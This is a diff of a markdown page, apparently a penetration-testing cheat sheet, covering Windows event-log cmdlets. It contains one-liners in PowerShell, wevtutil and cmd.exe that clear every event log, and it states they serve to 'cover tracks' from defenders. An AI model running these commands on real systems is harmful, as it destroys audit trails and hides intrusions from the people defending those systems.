 Get-EventLog -LogName System -ComputerName Server01, Server02, Server03
 ```
 
-&#x20;If the **ComputerName** parameter isn't specified, `Get-EventLog` defaults to the local computer. The parameter also accepts a dot (`.`) to specify the local computer. The **ComputerName** parameter doesn't rely on Windows PowerShell remoting, so you can use this even if your computer is not configured to run remote commands.
+ If the **ComputerName** parameter isn't specified, `Get-EventLog` defaults to the local computer. The parameter also accepts a dot \(`.`\) to specify the local computer. The **ComputerName** parameter doesn't rely on Windows PowerShell remoting, so you can use this even if your computer is not configured to run remote commands.
 
-&#x20;The `Remove-EventLog` cmdlet deletes an event log file from a local or remote computer and unregisters all its event sources for the log. You can also use this cmdlet to unregister event sources without deleting any event logs.
+ The `Remove-EventLog` cmdlet deletes an event log file from a local or remote computer and unregisters all its event sources for the log. You can also use this cmdlet to unregister event sources without deleting any event logs.
 
 {% hint style="info" %}
 **`Get-EventLog`** uses a Win32 API that is deprecated so the results may not be accurate. Use the **`Get-WinEvent`** cmdlet instead on systems running Windows Vista+.
@@ -581,7 +512,7 @@ Get-EventLog -LogName System -ComputerName Server01, Server02, Server03
 
 #### List updated log formats in Windows Vista+
 
-```powershell
+```text
 Get-WinEvent -ListLog *
 ```
 
@@ -593,35 +524,37 @@ Warning! information overload! Lists each individual windows event rather than t
 {% tab title="PowerShell" %}
 Lists all of the non-empty logfiles, then clears each one.
 
-#### Legacy command (may not be completely accurate in Windows Vista+)
+#### Legacy command \(may not be completely accurate in Windows Vista+\)
 
-```powershell
+```text
 Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
 ```
 
 #### Windows Vista+ Logs
 
-```powershell
+```text
 Get-WinEvent -ListLog * | where {$_.RecordCount} | ForEach-Object -Process { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($_.LogName) }
 ```
 
-#### Windows built-in command (not pure PowerShell)
+#### Windows built-in command \(not pure PowerShell\)
 
-```powershell
+```text
 wevtutil el | Foreach-Object {wevtutil cl "$_"}
 ```
 {% endtab %}
 
 {% tab title="cmd.exe" %}
-List all event logs with `wevutil.exe el` then clear each one with `wevutil.exe cl`. &#x20;
+List all event logs with `wevutil.exe el` then clear each one with `wevutil.exe cl`.  
 
-```
+```text
 for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"
 ```
 {% endtab %}
 {% endtabs %}
 
-&#x20;Can disable logging prior to doing things that would alert defenders, or can clear logs afterwards to cover tracks...TODO add more details
+ can disable logging prior to doing things that would alert defenders, or can clear logs afterwards to cover tracks...TODO add more details
+
+
 
 ## Misc - to sort
 
@@ -649,3 +582,4 @@ for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"
 
 
 If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
+
